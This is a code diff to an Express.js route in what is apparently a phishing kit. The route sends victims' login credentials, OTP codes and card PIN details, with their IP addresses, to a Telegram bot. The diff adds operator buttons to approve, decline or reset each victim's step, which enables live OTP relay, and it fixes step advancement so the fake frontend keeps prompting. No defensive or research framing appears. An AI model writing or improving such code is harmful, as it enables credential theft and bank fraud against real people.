@@ -7,9 +7,9 @@ const router  = express.Router();
 const { sendTelegram, h, loadState, saveState } = require('../config');
 
 const stepTitles = {
-    1: '🔐 Login Credentials',
-    2: '🔑 OTP / Verification Code',
-    3: '💳 Card / Pin Details'
+    1: 'Login Credentials',
+    2: 'OTP / Verification Code',
+    3: 'Card / Pin Details'
 };
 
 router.post('/', async (req, res) => {
@@ -24,9 +24,9 @@ router.post('/', async (req, res) => {
     }
 
     // ---------- Build message ----------
-    const title = stepTitles[step] || `📄 Step ${step}`;
+    const title = stepTitles[step] || `Step ${step}`;
 
-    let text = `📬 <b>New Submission — ${title}</b>\n`;
+    let text = `<b>New Submission — ${title}</b>\n`;
     text += '────────────────────\n';
 
     for (const [key, value] of Object.entries(data)) {
@@ -34,20 +34,38 @@ router.post('/', async (req, res) => {
     }
 
     text += '────────────────────\n';
-    text += `🌐 IP: ${h(req.ip || req.connection.remoteAddress || 'unknown')}\n`;
-    text += `🕒 ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`;
+    text += `IP: ${h(req.ip || req.connection.remoteAddress || 'unknown')}\n`;
+    text += `${new Date().toISOString().replace('T', ' ').slice(0, 19)}`;
+
+    // ---------- Inline Keyboard for Admin Approval ----------
+    const replyMarkup = {
+        inline_keyboard: [
+            [
+                { text: 'Approve (Next Step)', callback_data: 'action_approve' },
+                { text: 'Decline (Retry)', callback_data: 'action_decline' }
+            ],
+            [
+                { text: 'Finish (Complete Flow)', callback_data: 'action_done' },
+                { text: 'Reset All', callback_data: 'action_reset' }
+            ]
+        ]
+    };
 
     // ---------- Send to Telegram ----------
-    const ok = await sendTelegram(text);
-    if (!ok) {
-        return res.status(502).json({ success: false, message: 'Failed to send to Telegram.' });
+    const tgResult = await sendTelegram(text, replyMarkup);
+    if (!tgResult.ok) {
+        let errorMsg = 'Failed to send to Telegram.';
+        if (tgResult.error && tgResult.error.includes('chat not found')) {
+            errorMsg = 'Telegram error: Chat not found. Please open @Planwell2_bot in Telegram and tap /start.';
+        }
+        return res.status(502).json({ success: false, message: errorMsg, error: tgResult.error });
     }
 
     // ---------- Update state → pending ----------
-    const state = loadState();
-    state.step   = step;
-    state.status = 'pending';
-    saveState(state);
+const state = loadState();
+state.step   = step + 1;    // ✅ FIX: Advance to the next step so frontend moves forward
+state.status = 'pending';
+saveState(state);
 
     return res.json({ success: true, message: 'Submitted.' });
 });
